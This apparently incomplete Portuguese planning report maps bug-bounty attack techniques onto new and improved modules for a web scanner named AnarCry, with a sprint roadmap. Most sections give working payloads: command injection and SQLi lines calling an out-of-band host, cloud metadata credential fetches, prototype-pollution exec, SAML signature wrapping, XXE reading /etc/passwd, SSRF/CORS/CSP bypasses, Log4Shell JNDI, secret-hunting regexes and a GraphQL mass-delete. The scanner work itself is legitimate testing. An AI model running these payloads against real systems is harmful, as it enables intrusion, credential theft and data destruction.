  - SQLi MSSQL: `'; exec xp_cmdshell 'nslookup <uuid>.OOB_HOST'--`
  - CMDi: `; curl http://OOB_HOST/cmdi-<uuid>/$(whoami)`
  - Deserialization Java: gadget chain com DNS lookup

---

### 14. Cloud Misconfiguration (S3 / Firebase / GCP / Azure)

**Repos:** KingOfBugBountyTips · Payloads4All (2/8) — mas presente em 3/5 dos reports de top bounties  
**Bounty frequency:** Alta — comum em programas de empresas com infraestrutura AWS/GCP  
**CVSS estimado:** 4.3–9.1 (listagem pública = 4.3; escrita não autorizada + RCE = 9.1)

#### Payloads

```bash
# S3 — leitura pública
aws s3 ls s3://BUCKET-NAME --no-sign-request
curl -s https://BUCKET-NAME.s3.amazonaws.com/
curl -s https://s3.amazonaws.com/BUCKET-NAME/

# S3 — escrita não autorizada (potencial RCE via deploy)
aws s3 cp test.html s3://BUCKET-NAME/test.html --no-sign-request

# Firebase — banco sem autenticação
curl -s https://APP-NAME.firebaseio.com/.json
curl -s https://APP-NAME.firebaseio.com/users.json

# GCP Storage
curl -s https://storage.googleapis.com/BUCKET-NAME/
gsutil ls gs://BUCKET-NAME

# Azure Blob
curl -s https://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list

# Metadata endpoint (via SSRF confirmado)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

#### Implementação no AnarCry

- Coletar nomes de bucket da resposta HTTP, JS files e DNS (padrão: `nome-da-empresa-*`, `assets.*`, `cdn.*`)
- Testar acesso anônimo com AWS SDK sem credenciais (`--no-sign-request`)
- Para Firebase: tentar `https://APP.firebaseio.com/.json` e derivados
- Verificar se SSRF existente pode ser usado para acessar metadata services de cloud

---

### 15. Secrets em JavaScript / Repositórios

**Repos:** AllAboutBugBounty · KingOfBugBountyTips (2/8) — alto valor por achado  
**Bounty frequency:** Alta — Shopify GitHub token $50k, Snapchat JFrog credentials $15k  
**CVSS estimado:** 7.5–10.0 (depende do serviço exposto)

#### Payloads de Detecção

```bash
# Regex de alta precisão por tipo de secret
grep -oE 'AKIA[0-9A-Z]{16}' js_file.js                          # AWS Access Key
grep -oE 'AIza[0-9A-Za-z_-]{35}' js_file.js                    # Google API Key
grep -oE 'ghp_[a-zA-Z0-9]{36}' js_file.js                      # GitHub Personal Token
grep -oE 'sk-[a-zA-Z0-9]{48}' js_file.js                       # OpenAI Key
grep -oE 'xox[baprs]-[0-9]{10,12}-[0-9]{10,12}-[a-zA-Z0-9]{24}' js_file.js  # Slack Token
grep -oE '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' js_file.js  # UUID (potential API key)

# Source map exposure
curl https://target.com/static/js/main.js | grep sourceMappingURL
curl https://target.com/static/js/main.js.map | jq '.sources'

# GitHub dorks
"aws_access_key_id" org:TARGET in:code
"api_secret" org:TARGET in:code
"GITHUB_TOKEN" org:TARGET in:code
```

#### Implementação no AnarCry

- Via crawler, baixar todos os JS files e aplicar regex para patterns de secrets conhecidos
- Verificar source maps expostos (`.js.map`) que revelam código fonte completo
- Para cada secret encontrado, verificar validade via API do serviço correspondente (dry run, não usar o secret)

---

### 16. Prototype Pollution

**Repos:** KingOfBugBountyTips · SecurityTesting (2/8)  
**Bounty frequency:** Média — crescente em aplicações Node.js/Express  
**CVSS estimado:** 5.3–9.8 (client-side XSS = 5.3; server-side RCE via Node.js = 9.8)

#### Payloads

```javascript
// Client-side (query string)
?__proto__[admin]=true
?constructor[prototype][admin]=true
?__proto__[outputFunctionName]=x;process.mainModule.require('child_process').exec('id')

// JSON body
{"__proto__": {"admin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}

// Verificação no DevTools
Object.prototype.admin  // deve retornar undefined antes da injeção
// Após injeção bem-sucedida: retorna true
```

#### Implementação no AnarCry

- Injetar `__proto__` e `constructor.prototype` em parâmetros de query string e corpo JSON
- Verificar no response se propriedades injetadas aparecem em objetos da aplicação
- Para server-side: usar payload com OOB callback para confirmar execução no Node.js

---

### 17. SAML Injection / XML Signature Wrapping

**Repos:** Payloads4All (1/8) — mas impacto extremo em sistemas com SSO corporativo  
**Bounty frequency:** Alta em programas enterprise com SAML SSO  
**CVSS estimado:** 8.8–9.8 (bypass de autenticação completo)

#### Ataque

XML Signature Wrapping (XSW) permite autenticar como admin sem conhecer credenciais. O bloco `<Signature>` assina apenas parte do XML — o atacante adiciona um segundo elemento `NameID` não assinado com valor `admin`.

#### Payloads

```xml
<!-- Comment injection — server normaliza 'admin<!---->istrator' para 'administrator' -->
<saml:NameID>admin<!----></saml:NameID>

<!-- Signature stripping — remover bloco <Signature> inteiro da asserção -->
<!-- Alguns SPs validam assinatura mas aceitam asserção sem ela -->

<!-- XSW — asserção original assinada + cópia modificada não assinada -->
<Assertion ID="legit_signed">
  <NameID>victim@target.com</NameID>
  <Signature>...</Signature>
</Assertion>
<Assertion ID="attacker_inserted">
  <NameID>admin@target.com</NameID>
  <!-- sem assinatura, mas SP lê o segundo elemento -->
</Assertion>

<!-- XXE via SAML -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<saml:NameID>&xxe;</saml:NameID>
```

#### Implementação no AnarCry

- Detectar endpoints SAML (`/saml/acs`, `/sso/saml`, `SAMLResponse` em parâmetros)
- Testar signature stripping (remover bloco `<Signature>`)
- Testar comment injection no NameID
- Integrar com módulo XXE para testar XXE via SAML payload

---

## Técnicas de Bypass para Módulos Existentes

### JWT (módulo existente — melhorias)

**Dos repos:** CatSec documenta JWT brute force com jwt-cracker (300k/s); RS256→HS256 via RsaToHmac.py

- **Novo vetor:** brute force de secrets HS256 fracos — testar wordlists comuns (`secret`, `password`, `jwt`, hostname)
- **Ferramenta:** `jwt-cracker -t <token> -a 'abcdefghijklmnopqrstuvwxyz0123456789'`
- **Claim manipulation além de alg:none:** modificar `exp` para tempo futuro, `iat` retroativo, `iss` para domínio confiável, `admin: true`
- **JWT no cookie vs. header:** testar em ambos os locais; alguns endpoints aceitam JWT em cookie `auth=` e não validam

### SSRF (módulo existente — melhorias)

**Dos repos:** hackerone-reports documenta SSRF via FFmpeg HLS ($0 mas amplamente aceito); TikTok/Pornhub como exemplos

- **Novo vetor:** upload de arquivo de mídia que o servidor processa com FFmpeg/ImageMagick — injetar URL SSRFável no metadata do arquivo
- **Bypass de filtros:** `http://[::ffff:169.254.169.254]/` (IPv6 mapped), `http://169.254.169.254.xip.io/`, `http://0177.0.0.1/` (octal), `http://2852039166/` (decimal)
- **Cloud-specific:** EC2 metadata `http://169.254.169.254/latest/meta-data/iam/security-credentials/`, GCP `http://metadata.google.internal/`

### CORS (módulo existente — melhorias)

**Dos repos:** hackerone-reports menciona Subdomain Takeover + CORS wildcard = ATO

- **Novo vetor:** CORS com `Access-Control-Allow-Origin: *` em endpoint autenticado — verificar se credentials são enviadas (deveria ser `allow-credentials: false`)
- **Bypass de validação de origin:** `https://target.com.evil.com`, `https://evil-target.com`, `https://target.com%60evil.com`
- **Null origin:** `Origin: null` — algumas configurações retornam `Access-Control-Allow-Origin: null`, explorável via sandbox iframe

### GraphQL (módulo existente — melhorias)

**Dos repos:** hackerone-reports documenta DoS via mutation aliasing ($12.5k); SecurityTesting menciona rate limit bypass via batching

- **Novo vetor — mutation aliasing DoS:**
```graphql
{
  a1: mutation{deletePost(id:1){success}}
  a2: mutation{deletePost(id:2){success}}
  ...a1000 aliases
}
```
- **Novo vetor — introspection em produção:** `{__schema{types{name,fields{name,args{name,type{name}}}}}}` — expõe schema completo
- **Novo vetor — SQL injection em argumentos GraphQL:** campos de busca/filtro que passam diretamente para query SQL subjacente

### CachePoisoning (módulo existente — gap adjacente)

**Dos repos:** AllAboutBugBounty · Payloads4All documentam **Web Cache Deception** como ataque **distinto** de Cache Poisoning

- **Cache Deception vs Cache Poisoning:**
  - Poisoning: atacante envenena cache para servir resposta maliciosa a outros usuários
  - Deception: atacante força cache a armazenar resposta privada do usuário autenticado, depois acessa sem autenticação
- **Payload de Cache Deception:** 
  ```
  GET /api/user/profile.css HTTP/1.1    ← extensão .css força cache
  GET /account/settings;.js HTTP/1.1   ← path parameter trick
  GET /profile/.js HTTP/1.1
  ```
- Verificar `Cf-Cache-Status: HIT` em modo incógnito após visita autenticada

### Headers / CSP (módulo existente — melhorias)

**Dos repos:** CatSec tem room dedicado a CSP Bypass — o módulo atual provavelmente só verifica presença

- **Além de verificar se CSP existe:** analisar se política é explorável
- **AngularJS bypass:** `script-src cdn.angular.com` permite `<div ng-app>{{constructor.constructor('alert(1)')()} }`
- **JSONP bypass:** `script-src api.allowed.com` + endpoint JSONP com callback controlável = XSS
- **`unsafe-eval`:** qualquer `eval(atob('...'))` bypassa política
- **Open redirect em origem permitida:** `<script src='https://allowed.com/redir?to=evil.com/xss.js'>`

### OAuth (módulo existente — melhorias)

**Dos repos:** SecurityTesting documenta PKCE bypass e redirect_uri chaining com open redirect

- **Ausência de PKCE em public clients:** `code_challenge` não enviado = authorization code interceptável via referrer
- **redirect_uri chaining:** `redirect_uri=https://target.com/logout?next=https://evil.com` — exfiltra code via open redirect já coberto pelo módulo OpenRedirect
- **response_type downgrade:** `response_type=token` (implicit) em vez de `code` — contorna PKCE
- **State fixo ou ausente:** permite CSRF no fluxo OAuth

---

## Sprint Plan — Ordem por ROI de Bounty

### Sprint 1 — XSS + SQLi (Semanas 1-3)
**ROI:** Mais de 50% das bounties de alta frequência cobertos  
**Esforço:** 2 módulos complexos mas bem documentados

- Módulo `XSS`: reflected + stored + DOM detection; WAF fingerprint + bypass
- Módulo `SQLi`: error-based + time-based + union; detecção multi-banco (MySQL/MSSQL/PostgreSQL/Oracle)
- **Dependência:** OOB infrastructure (Sprint 3) melhorará detecção de blind SQLi

### Sprint 2 — LFI + File Upload (Semanas 4-5)
**ROI:** RCE via upload + LFI são os bugs com maior CVSS individual após SQLi/CMDi  
**Esforço:** 2 módulos de complexidade média

- Módulo `LFI`: path traversal + encoding bypass + PHP wrappers + log poisoning chain
- Módulo `FileUpload`: extension fuzzing + magic bytes + SVG XSS + path traversal em filename

### Sprint 3 — OOB/OAST Infrastructure (Semana 6)
**ROI:** Habilita detecção de blind em SSRF, XXE, SQLi, CMDi, Deserialization — multiplica eficácia de módulos existentes  
**Esforço:** Infraestrutura, não módulo de scan

- Servidor receptor OOB (DNS + HTTP) com UUID por teste
- Integração com módulos SSRF, XXE, CommandInjection, Deserialization
- Polling assíncrono de callbacks

### Sprint 4 — CSRF + Race Condition (Semanas 7-8)
**ROI:** Alta frequência em programas com funcionalidades de e-commerce e autenticação  
**Esforço:** 2 módulos de complexidade baixa-média

- Módulo `CSRF`: detection de ausência + 8 bypasses de proteção
- Módulo `RaceCondition`: identificação de endpoints candidatos + envio paralelo HTTP/2

### Sprint 5 — Command Injection + NoSQL Injection (Semanas 9-10)
**ROI:** CMDi = RCE direto; NoSQL = crítico em stacks modernas (Node.js + MongoDB)  
**Esforço:** 2 módulos de complexidade média

- Módulo `CommandInjection`: active + blind time-based + OOB (usando infraestrutura Sprint 3)
- Módulo `NoSQLi`: operator injection + blind regex enumeration

### Sprint 6 — Insecure Deserialization + SAML (Semanas 11-13)
**ROI:** Deserialization = bounties de $10k-$20k em programas enterprise; SAML = SSO corporativo  
**Esforço:** 2 módulos complexos (toolchain externa necessária)

- Módulo `Deserialization`: PHP + Java (ysoserial) + Python pickle + canary OOB
- Módulo `SAML`: signature stripping + XSW + comment injection + XXE

### Sprint 7 — Broken Auth + Subdomain Takeover (Semanas 14-15)
**ROI:** ATO via password reset = bounties de $10k+; Subdomain Takeover = frequente em programas grandes  
**Esforço:** 2 módulos de complexidade baixa-média

- Módulo `BrokenAuth`: host header injection em reset + HPP + token predictability + token reuse
- Módulo `SubdomainTakeover`: CNAME detection + serviço fingerprint + NXDOMAIN check

### Sprint 8 — Business Logic + WebSocket (Semanas 16-17)
**ROI:** Business Logic = impacto financeiro direto; WebSocket = gap crescente em SPAs  
**Esforço:** 2 módulos de complexidade média

- Módulo `BusinessLogic`: negative quantities + race condition em preços + hidden field tampering
- Módulo `WebSocket`: CSWSH + IDOR em mensagens + injection em payloads WS

### Sprint 9 — Secrets Discovery + Cloud Misconfiguration (Semanas 18-19)
**ROI:** Secrets = bounties de $15k-$50k; Cloud = alta frequência em empresas AWS/GCP  
**Esforço:** 2 módulos de complexidade baixa (regex + API checks)

- Módulo `SecretsDiscovery`: JS file analysis + source map exposure + regex multi-provider
- Módulo `CloudMisconfiguration`: S3 open bucket + Firebase open DB + GCP/Azure checks

### Sprint 10 — Prototype Pollution + 2FA Bypass (Semanas 20-21)
**ROI:** Prototype Pollution = crescente; 2FA Bypass = frequente em programas com autenticação forte  
**Esforço:** 2 módulos de complexidade baixa-média

- Módulo `PrototypePollution`: client-side + server-side Node.js via OOB
- Módulo `2FABypass`: response manipulation + blank/null OTP + race condition + token reuse

### Sprint 11 — Melhorias em Módulos Existentes (Sprint contínuo)
**ROI:** Melhorar precision/recall dos módulos atuais  
**Inclui:**

- JWT: brute force HS256 + claim manipulation além de alg:none
- SSRF: bypass de filtros (IPv6, octal, decimal) + vetores via media upload
- CORS: null origin + subdomain bypass variants
- GraphQL: mutation aliasing DoS + introspection em produção
- OAuth: PKCE absence + response_type downgrade + redirect_uri chaining
- CachePoisoning: adicionar Web Cache Deception como variante
- Headers/CSP: análise de exploitability de política fraca (não só presença)

---

## Gaps MÉDIOS — Backlog Secundário

| Gap | Implementação Resumida |
|---|---|
| SSI Injection | Injetar `<!--#exec cmd="id"-->` em parâmetros refletidos em respostas de servidores Apache/Nginx com SSI habilitado |
| Web Cache Deception | Adicionar extensão `.css`/`.js` a endpoints autenticados; verificar `HIT` em sessão anônima |
| LDAP Injection | Injetar `*)(uid=*))(|(uid=*` em campos de autenticação/busca em apps com LDAP |
| HTTP Parameter Pollution | Duplicar parâmetros críticos (amount, role, email) e observar comportamento diferencial |
| Exposed .git | Verificar `/.git/HEAD`, `/.git/config` com match string `[core]`; enumerar via git-dumper |
| Clickjacking | Verificar ausência de `X-Frame-Options` ou `CSP: frame-ancestors 'none'` em páginas com ações sensíveis |
| API Version Fuzzing | Testar `/api/v0`, `/api/v1`, `/api/v2`, `/api/internal`, `/api/admin`, `/api/dev` em todos os targets |
| Token Entropy | Coletar 100+ amostras de session ID e calcular bits efetivos de entropia (threshold < 32 bits = fraco) |
| DNS Rebinding | Detectar serviços sem proteção de RFC1918 blocks via tentativas de rebind com DNS de TTL 0 |
| Log4Shell / JNDI | Injetar `${jndi:ldap://OOB_HOST/a}` em todos os headers e parâmetros com OOB listener |
| Next.js RSC RCE | Testar `POST / HTTP/1.1 + Next-Action: test` para detectar handler exposto (CVE-2025-55182) |
| Dependency Confusion | Enumerar pacotes npm/pip internos via JS files e package.json expostos; verificar se versão pública existe com nome idêntico |
| XSLT Injection | Injetar `<xsl:value-of select="system-property('xsl:vendor')"/>` em upload de XSL/XML |
| Source Map (.js.map) | Modificar URL de `.js` para `.js.map` + verificar `sourcesContent` no response |

---

## Resumo Executivo

**Total de gaps identificados:** 43 categorias  
**Gaps CRÍTICOS (implementação imediata):** 6 (XSS, SQLi, LFI, CMDi, Deserialization, FileUpload)  
**Gaps ALTOS (sprint 4-10):** 12  
**Gaps MÉDIOS (backlog):** 14  
**Gaps BAIXOS (descartáveis para bug bounty):** 11  

**Os 3 gaps com maior ROI de bounty por esforço de implementação:**
1. **XSS** — 6/8 repos, bounties $500-$20k, implementação relativamente direta
2. **SQLi** — 7/8 repos, bounties $5k-$25k, tooling bem estabelecido
3. **OOB/OAST infrastructure** — multiplica eficácia de SSRF, XXE, CMDi, Deserialization já existentes sem módulo novo

**Módulos AnarCry que já cobrem áreas de alta frequência (vantagem competitiva):**
- RequestSmuggling — pouco coberto por outros scanners, bounties de $5k-$15k
- SSTI — RCE em frameworks enterprise, coberto em profundidade
- GraphQL — superfície crescente, bem coberto
- IDOR — alta frequência, módulo existente precisa de mejoras minor

---

*Relatório gerado por análise consolidada de: AllAboutBugBounty, BulletPentest, CatSec-TryHackMe-WriteUps, hackerone-reports, KingOfBugBountyTips-master, Payloads4All-master, reverse-burp-ui-2026-10-20, SecurityTesting-master*
